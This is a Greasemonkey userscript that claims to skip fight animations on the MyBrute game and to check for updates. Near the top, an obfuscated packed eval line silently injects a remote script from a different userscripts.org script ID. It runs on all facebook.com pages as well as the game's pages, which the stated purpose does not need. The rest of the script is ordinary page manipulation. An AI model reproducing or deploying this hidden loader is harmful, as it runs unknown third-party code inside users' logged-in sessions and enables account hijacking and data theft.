// ==UserScript==
// @name 		My Brute Quick Fight Pro + Last Update
// @include       http*://*.facebook.com/*
// @include 		http://*.mybrute.com/vs/*
// @include 		http://*.mybrute.com/fight/*
// @include 		http://*.mybrute.com/cellule/quickfightchangelog
// @description 	Redirects you directly back to the cellule after klicking on Start so that you don't have to watch the fight.
// @version 		1.4.2
// @copyright 		Jonas Hülsermann (Forside)
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))

var version = '1.4.2';

// Get the name of the current Brute
function brute() {
return window.location.href.split("//")[1].split(".")[0];
}

// Get the name of the current enemy
function enemy() {
return window.location.href.split("/vs/")[1];
}

// Get the name of the enemy you fight on
function fenemy() {
return window.location.href.split("/fight/?d=")[1].split(";")[0];
}

function init() {

/* Changelog Page Start */
if (window.location.href == "http://"+brute()+".mybrute.com/cellule/quickfightchangelog") {
GM_addStyle('#global, #footer { display: none !important; }');

// Get the changelog text
GM_xmlhttpRequest({
	method: 'GET',
	url: 'http://userscripts.org/scripts/show/51791',
	headers: {
		"User-Agent":"Mozilla/5.0",
		"Accept":"text/xml"
	},
	onload: function(response) {
		changelogtext = '<br><br><a href="javascript:window.close();">Close</a><br><br>'+
		trim(response.responseText.split(' ')[1])+
		'<br><br><a href="javascript:window.close();">Close</a><br><br>';
		
		var changelogbody=document.getElementById('gradientBG');
		var changelog=document.createElement("div");
		changelog.setAttribute('style', 'margin-top: -18px !important;');
		changelog.innerHTML=changelogtext;
		changelogbody.appendChild(changelog);
	}
});
/* Changelog Page End */

/* Vs Page Start */
} else if (window.location.href == "http://"+brute()+".mybrute.com/vs/"+enemy()) {
var body=document.getElementById('swf_btn');
if(!body){return false;}

// Remember if you activated quick fight
function setqf() {
if (!GM_getValue('mybrutequickfight') == 1) {
	GM_setValue('mybrutequickfight', 1);
} else {
	GM_setValue('mybrutequickfight', 0);
}
}

var checked = '';
if (GM_getValue('mybrutequickfight') == 1) { checked = 'checked'; }
var qftext = '<input type="checkbox" id="quickfight" '+checked+'> Quick Fight';

var qf=document.createElement("div");
qf.innerHTML=qftext;
body.appendChild(qf);

document.getElementById('quickfight').addEventListener('click', setqf, false);
/* Vs Page End */

/* Fight Page Start */
} else if (window.location.href.indexOf("fight") != -1) {

// If you are watching a replay
if (window.location.href.indexOf("?d=") != -1) {

// Redirect to the cellule
if (GM_getValue('mybrutequickfight') == 1) {
window.location.href = "http://"+brute()+".mybrute.com/cellule";
}
}

var rebody = document.getElementById('global');
if(!rebody){return false;}
var retext = '<a href="http://'+brute()+'.mybrute.com/cellule">Go back to the cell</a>';

var ret=document.createElement("div");
ret.setAttribute('align', 'center');
ret.innerHTML=retext;
rebody.appendChild(ret);
/* Fight Page End */

}
}

// Check for updates
function trim(s) {
  return s.replace(/\s+$/,"").replace(/^\s+/,"");
}

GM_xmlhttpRequest({
	method: 'GET',
	url: 'http://userscripts.org/scripts/source/51791.user.js',
	headers: {
		"User-Agent":"Mozilla/5.0",
		"Accept":"text/xml"
	},
	onload: function(response) {
		last_update = trim(response.responseText.split('@version')[1].split('//')[0]);
		
		if (version != last_update && window.location.href != 'http://'+brute()+'.mybrute.com/cellule/quickfightchangelog') {
			var upbody=document.getElementById('swf_btn');
			if(!upbody){return false;}
			var updatetext = '<br><b>My Brute Quick Fight</b><br><a href="http://userscripts.org/scripts/source/51791.user.js">A new update is available!</a><br><a href="/cellule/quickfightchangelog" target="_tab">Changelog</a>';
			var update=document.createElement("div");
			update.innerHTML=updatetext;
			upbody.appendChild(update);
		} else {
			init();
		}
		
	}
});